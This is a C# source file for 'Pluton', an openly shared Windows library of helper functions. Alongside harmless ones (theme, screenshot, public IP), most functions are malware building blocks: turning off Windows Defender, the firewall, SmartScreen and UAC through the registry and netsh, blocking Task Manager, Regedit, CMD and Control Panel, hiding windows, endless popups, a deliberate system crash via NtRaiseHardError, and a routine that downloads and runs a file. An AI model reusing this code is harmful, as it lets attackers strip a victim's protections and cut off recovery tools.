#region Pluton Project
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
using Microsoft.Win32;                                                                                          
using System;                                                                                                  
using System.Diagnostics;                                                                                                                                                                            //
using System.Drawing;                                                                                           
using System.Linq;                                                                                             
using System.Net;                                                                                               
using System.Runtime.InteropServices;                                                                                                                                                     //
using System.Windows.Forms;                                                                                     
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                         ____  __    __  ____________  _   __                                 
//                                        / __ \/ /   / / / /_  __/ __ \/ | / /                                 
//                                       / /_/ / /   / / / / / / / / / /  |/ /                                  
//                                      / ____/ /___/ /_/ / / / / /_/ / /|  /                                   
//                                     /_/   /_____/\____/ /_/  \____/_/ |_/                                   
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Library Made by Radu Andrei.                                                                                 
// Licence: MIT (Open Source)                                                                                   
// Discord Server: https://discord.gg/wDsypVz                                                                   
// Read documentation.md                                                                                        
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#region Pluton Namespace
namespace Pluton
{
    #region Process Class
    public static class PProcess
    {
        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);



        // MAKE PROCESS CRITICAL (WHEN YOU END THE PROCESS A BSOD WILL APPEAR).
        public static void MakeCritical()
        {
            bool t1;
            uint t2;
            RtlAdjustPrivilege(19, true, false, out t1);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
        }

    }
    #endregion

    #region Console Window Class
    public static class PConsoleWindow
    {

        [DllImport("kernel32.dll", ExactSpelling = true)]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        private static extern int DeleteMenu(IntPtr hMenu, int nPosition, int wFlags);

        [DllImport("user32.dll")]
        private static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        private const int MF_BYCOMMAND = 0x00000000;
        private const int SC_CLOSE = 0xF060;
        private const int SC_MINIMIZE = 0xF020;
        private const int SC_MAXIMIZE = 0xF030;
        private const int SC_SIZE = 0xF000;

        // HIDE CONSOLE.
        public static void HideConsole()
        {
            IntPtr handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
        }

        // SHOW CONSOLE.
        public static void ShowConsole()
        {
            IntPtr handle = GetConsoleWindow();
            ShowWindow(handle, SW_SHOW);
        }

        // WINDOW CANNOT BE RESIZED ANYMORE.
        public static void NoResizable()
        {
            IntPtr handle = GetConsoleWindow();
            IntPtr sysMenu = GetSystemMenu(handle, false);


            DeleteMenu(sysMenu, SC_SIZE, MF_BYCOMMAND);
        }

        // CANNOT INTERACT ANYMORE WITH WINDOW BAR BUTTONS (_ ☐ X)
        public static void DisableBarButtons()
        {
            IntPtr handle = GetConsoleWindow();
            IntPtr sysMenu = GetSystemMenu(handle, false);

            DeleteMenu(sysMenu, SC_CLOSE, MF_BYCOMMAND);
            DeleteMenu(sysMenu, SC_MINIMIZE, MF_BYCOMMAND);
            DeleteMenu(sysMenu, SC_MAXIMIZE, MF_BYCOMMAND);
        }
    }

    #endregion

    #region Tools Class
    public static class PTools
    {

        // SHUTDOWN OR RESTART THE COMPUTER
        public static void Shutdown(bool restart_t = false)
        {
            if (restart_t == true)
            {
                Process.Start("shutdown.exe", "-r -t 0");
            }
            else if (restart_t == false)
            {
                Process.Start("shutdown.exe", "/s /f /t 0");
            }
        }

        // MAKE A SCREENSHOT AND SAVE IT IN YOUR PROGRAM DIRECTORY.
        public static void Screenshot(string screenshotName_t)
        {
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                bmp.Save(screenshotName_t + ".png");  // saves the image
            }
        }

        public static void InfinitePopup(string msg_t, string title_t, MessageBoxButtons buttons_t = MessageBoxButtons.OK, MessageBoxIcon icon_t = MessageBoxIcon.Information)
        {
            while (true)
            {
                MessageBox.Show(msg_t, title_t, buttons_t, icon_t);
            }
        }
    }
    #endregion
}
#endregion


#region Pluton.WIndowsSystemFeatures Namespace
namespace Pluton.WindowsSystemFeatures
{

    #region Security Systems Class
    public static class PSecuritySystems
    {
        public static void WindowsDefender(bool enable_t)
        {
            try
            {
                RegistryKey disableAntiSpyware = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows Defender");
                RegistryKey DisableAntivirus = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows Defender\Real-Time Protection");
                if (enable_t == false)
                {

                    disableAntiSpyware.SetValue("DisableAntiSpyware", "1", RegistryValueKind.DWord);
                    disableAntiSpyware.Close();

                    DisableAntivirus.SetValue("DisableBehaviorMonitoring", "1", RegistryValueKind.DWord);
                    DisableAntivirus.SetValue("DisableScanOnRealtimeEnable", "1", RegistryValueKind.DWord);
                    DisableAntivirus.SetValue("DisableOnAccessProtection", "1", RegistryValueKind.DWord);
                    DisableAntivirus.Close();
                }
                else if (enable_t == true)
                {

                    disableAntiSpyware.DeleteValue("DisableAntiSpyware");
                    disableAntiSpyware.Close();

                    DisableAntivirus.DeleteValue("DisableBehaviorMonitoring");
                    DisableAntivirus.DeleteValue("DisableScanOnRealtimeEnable");
                    DisableAntivirus.DeleteValue("DisableOnAccessProtection");
                    DisableAntivirus.Close();


                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }

        }

        public static void Firewall(bool enable_t)
        {
            Process proc = new Process();
            string top = "netsh.exe";
            if (enable_t == false)
            {
                proc.StartInfo.Arguments = "advfirewall set allprofiles state off";
                proc.StartInfo.FileName = top;
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.RedirectStandardOutput = true;
                proc.StartInfo.CreateNoWindow = true;
                proc.Start();
                proc.WaitForExit();
            }
            else if (enable_t == true)
            {

                proc.StartInfo.Arguments = "advfirewall set allprofiles state on";
                proc.StartInfo.FileName = top;
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.RedirectStandardOutput = true;
                proc.StartInfo.CreateNoWindow = true;
                proc.Start();
                proc.WaitForExit();
            }
        }

        public static void SmartScreen(bool enable_t)
        {
            try
            {
                RegistryKey disableSmartscreen = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
                if (enable_t == false)
                {
                    disableSmartscreen.SetValue("EnableSmartScreen", "0", RegistryValueKind.DWord);
                    disableSmartscreen.Close();
                }
                else if (enable_t == true)
                {
                    disableSmartscreen.SetValue("EnableSmartScreen", "1", RegistryValueKind.DWord);
                    disableSmartscreen.Close();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }

        public static void DisableUAC()
        {
            try
            {
                Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Action Center\\Checks\\{C8E6F269-B90A-4053-A3BE-499AFCEC98C4}.check.0", "CheckSetting", StringToByteArray("23004100430042006C006F00620000000000000000000000010000000000000000000000"), RegistryValueKind.Binary);

                RegistryKey uac = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
                uac = Registry.LocalMachine.CreateSubKey(("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"));


                uac.SetValue("ConsentPromptBehaviorAdmin", 0);
                uac.SetValue("PromptOnSecureDesktop", 0);
                uac.SetValue("EnableLUA", 0);
                uac.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }






        // NOT PART OF THE ACTUAL CLASS.
        private static byte[] StringToByteArray(string hex_m)
        {
            return Enumerable.Range(0, hex_m.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex_m.Substring(x, 2), 16))
                             .ToArray();
        }
    }
    #endregion

    #region Administrative Tools Class
    public static class PAdministrativeTools
    {
        public static void TaskMgr(bool enable_t)
        {
            try
            {
                RegistryKey disableTaskMgr = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                if (enable_t == false)
                {
                    disableTaskMgr.SetValue("DisableTaskMgr", "1");
                    disableTaskMgr.Close();
                }
                else if (enable_t == true)
                {

                    disableTaskMgr.DeleteValue("DisableTaskMgr");
                    disableTaskMgr.Close();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }

        public static void Regedit(bool enable_t)
        {
            try
            {
                RegistryKey disableRegedit = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                if (enable_t == false)
                {
                    disableRegedit.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
                    disableRegedit.Close();
                }
                else if (enable_t == true)
                {
                    disableRegedit.DeleteValue("DisableRegistryTools");
                    disableRegedit.Close();

                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }

        public static void CMD(bool enable_t)
        {
            try
            {
                RegistryKey disableCMD = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
                if (enable_t == false)
                {
                    disableCMD.SetValue("DisableCMD", "1", RegistryValueKind.DWord);
                    disableCMD.Close();
                }
                else if (enable_t == true)
                {

                    disableCMD.DeleteValue("DisableCMD");
                    disableCMD.Close();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }

        public static void IEOptions(bool enable_t)
        {
            try
            {
                RegistryKey disableIEOptions = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Internet Explore\Restrictions");
                if (enable_t == false)
                {
                    disableIEOptions.SetValue("NoBrowserOptions", "1", RegistryValueKind.DWord);
                    disableIEOptions.Close();
                }
                else if (enable_t == true)
                {

                    disableIEOptions.DeleteValue("NoBrowserOptions");
                    disableIEOptions.Close();

                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }

        public static void ControlPanel(bool enable_t)
        {
            try
            {
                RegistryKey disabeControlPanel = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                if (enable_t == false)
                {
                    disabeControlPanel.SetValue("NoControlPanel", "1", RegistryValueKind.DWord);
                    disabeControlPanel.Close();
                }
                else if (enable_t == true)
                {

                    disabeControlPanel.DeleteValue("NoControlPanel");
                    disabeControlPanel.Close();


                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }

        public static void SystemProperties(bool enable_t)
        {
            try
            {
                RegistryKey disableSystemProperties = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                if (enable_t == false)
                {
                    disableSystemProperties.SetValue("NoPropertiesMyComputer", "1", RegistryValueKind.DWord);
                    disableSystemProperties.Close();
                }
                else if (enable_t == true)
                {

                    disableSystemProperties.DeleteValue("NoPropertiesMyComputer");
                    disableSystemProperties.Close();

                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }

        public static void AdministrativeTools(bool enable_t)
        {
            try
            {
                RegistryKey HideAdministrativeTools = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced");
                if (enable_t == false)
                {
                    HideAdministrativeTools.SetValue("StartMenuAdminTools", "0", RegistryValueKind.DWord);
                    HideAdministrativeTools.Close();
                }
                else if (enable_t == true)
                {
                    HideAdministrativeTools.SetValue("StartMenuAdminTools", "1", RegistryValueKind.DWord);
                    HideAdministrativeTools.Close();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
    #endregion

    #region Desktop Class
    public static class PDesktop
    {
        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);
        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 1;

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindowEx(IntPtr hwndParent,
        IntPtr hwndChildAfter, string lpszClass, string lpszWindow);


        public static void HideTaskBar()
        {
            int hwnd = FindWindow("Shell_TrayWnd", "");
            ShowWindow(hwnd, SW_HIDE);
        }

        public static void ShowTaskBar()
        {
            int hwnd = FindWindow("Shell_TrayWnd", "");
            ShowWindow(hwnd, SW_SHOW);
        }

        public static void SetTheme(bool light)
        {
            try
            {
                GetPersonalizeKey().SetValue("AppsUseLightTheme", light ? 1 : 0, RegistryValueKind.DWord);
                GetPersonalizeKey().SetValue("SystemUsesLightTheme", light ? 1 : 0, RegistryValueKind.DWord);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }

        private static bool AppsUseLightTheme() => (int)GetPersonalizeKey().GetValue("AppsUseLightTheme") == 1;

        private static bool SystemUsesLightTheme() => (int)GetPersonalizeKey().GetValue("SystemUsesLightTheme") == 1;

        private static RegistryKey GetPersonalizeKey() => Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Themes\Personalize", true);
    }

    #endregion

    #region Network Class
    public static class PNetwork
    {
        // GET PUBLIC IP.
        public static void GetPublicIP()
        {
            string externalip = new WebClient().DownloadString("http://icanhazip.com");
            Console.WriteLine(externalip);
        }

        // DOWNLOAD THE FILE AND EXECUTE IT.
        public static void DownloadAndExecute(string url, string filePath)
        {
            WebClient wbb = new WebClient();
            wbb.DownloadFile(url, filePath);
            Process.Start(filePath);
        }

        // JUST DOWNLOAD A FILE.
        public static void Download(string url, string filePath)
        {
            WebClient wbb = new WebClient();
            wbb.DownloadFile(url, filePath);
        }

        // ENABLE AND DISABLE INTERNET CONNECTION.
        public static void InternetConnection(bool enable_t)
        {
            if (enable_t == false)
            {
                ProcessStartInfo internet = new ProcessStartInfo()
                {
                    FileName = "cmd.exe",
                    Arguments = "/C ipconfig /release",
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process.Start(internet);
            }
            else if (enable_t)
            {
                ProcessStartInfo internet = new ProcessStartInfo()
                {
                    FileName = "cmd.exe",
                    Arguments = "/C ipconfig /renew",
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process.Start(internet);
            }
        }
    }
    #endregion
}
#endregion

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#endregion